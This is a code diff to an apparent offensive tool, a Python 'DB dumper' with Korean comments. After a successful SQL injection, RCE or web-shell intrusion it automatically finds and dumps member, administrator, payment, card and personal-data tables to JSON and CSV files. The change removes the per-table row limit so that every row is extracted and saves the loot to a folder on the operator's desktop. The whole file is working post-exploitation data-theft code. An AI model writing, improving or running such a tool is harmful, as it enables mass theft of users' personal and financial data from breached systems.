@@ -1,21 +1,47 @@
-"""bingo/tools/db_dumper.py — 침투 성공 후 DB 자동 전체 덤프 엔진 (v2.7.0)
+"""bingo/tools/db_dumper.py — 침투 성공 후 DB 자동 전체 덤프 엔진 (v2.9.3)
 
 침투(SQLi/RCE/WebShell) 성공 즉시 자동으로:
   1. 전체 테이블 목록 수집
-  2. 회원 테이블 식별 → 전체 덤프
+  2. 회원 테이블 식별 → 전체 덤프 (행 수 제한 없음)
   3. 관리자 테이블 식별 → 전체 덤프
   4. 기타 민감 테이블 덤프 (결제/카드/개인정보)
   5. JSON + CSV 파일로 저장
+  저장 위치: 바탕화면/dump/타겟명_타임스탬프/
 """
 from __future__ import annotations
 
 import csv
 import json
 import os
+import pathlib
+import platform
 import re
 import time
 from dataclasses import dataclass, field
 from typing import Callable
+
+
+def _get_desktop_dump_dir(target: str) -> str:
+    """OS에 상관없이 바탕화면/dump/타겟명_타임스탬프/ 경로 반환.
+
+    macOS  : ~/Desktop/dump/{target}_{ts}/
+    Windows: ~/Desktop/dump/{target}_{ts}/  (OneDrive 바탕화면 자동 감지)
+    Linux  : ~/Desktop/dump/{target}_{ts}/  (없으면 ~/dump/{target}_{ts}/)
+    """
+    home = pathlib.Path.home()
+    ts = time.strftime("%Y%m%d_%H%M%S")
+
+    # Windows OneDrive 바탕화면 우선 탐색
+    if platform.system() == "Windows":
+        onedrive = home / "OneDrive" / "Desktop"
+        desktop = onedrive if onedrive.exists() else home / "Desktop"
+    else:
+        desktop = home / "Desktop"
+        if not desktop.exists():
+            desktop = home  # Linux 등 Desktop 없는 경우 홈 디렉터리 fallback
+
+    dump_dir = desktop / "dump" / f"{target}_{ts}"
+    return str(dump_dir)
 
 
 # ── 테이블 분류 키워드 ──────────────────────────────────────────────────────────
@@ -201,8 +227,7 @@ class DbDumper:
         if save_dir:
             self.save_dir = save_dir
         else:
-            ts = time.strftime("%Y%m%d_%H%M%S")
-            self.save_dir = f"dump_{self.target}_{ts}"
+            self.save_dir = _get_desktop_dump_dir(self.target)
         os.makedirs(self.save_dir, exist_ok=True)
 
     # ── 쿼리 실행 헬퍼 ───────────────────────────────────────────────────────
@@ -275,12 +300,14 @@ class DbDumper:
         return "other", 0
 
     # ── 단일 테이블 덤프 ─────────────────────────────────────────────────────
-    def _dump_table(self, table: TableInfo, max_rows: int = 50000) -> DumpResult:
+    def _dump_table(self, table: TableInfo, max_rows: int = 0) -> DumpResult:
+        """max_rows=0 이면 행 수 제한 없이 전체 덤프."""
         rows_all: list[dict] = []
         offset = 0
+        _unlimited = (max_rows == 0)
 
-        while offset < max_rows:
-            limit = min(self.batch_size, max_rows - offset)
+        while _unlimited or offset < max_rows:
+            limit = self.batch_size if _unlimited else min(self.batch_size, max_rows - offset)
             sql = self._q["dump_table"].format(table=table.name, limit=limit, offset=offset)
             batch = self._run(sql)
             if not batch or (len(batch) == 1 and "error" in batch[0]):
@@ -357,7 +384,7 @@ class DbDumper:
         dump_admin: bool = True,
         dump_sensitive: bool = True,
         dump_all: bool = False,
-        max_rows_per_table: int = 50000,
+        max_rows_per_table: int = 0,
     ) -> DbDumpReport:
         """
         침투 성공 직후 호출. 자동으로 전체 DB를 분류하고 우선순위 순서대로 덤프.
@@ -368,7 +395,7 @@ class DbDumper:
         dump_admin  : bool — 관리자 테이블 덤프 여부
         dump_sensitive : bool — 민감 테이블 (결제/세션 등) 덤프
         dump_all    : bool — True 시 분류 무관 모든 테이블 덤프
-        max_rows_per_table : int — 테이블 당 최대 추출 행 수
+        max_rows_per_table : int — 테이블 당 최대 추출 행 수 (0 = 무제한)
         """
         # DB 기본 정보 수집
         db_name = self._run_scalar(self._q["current_db"])
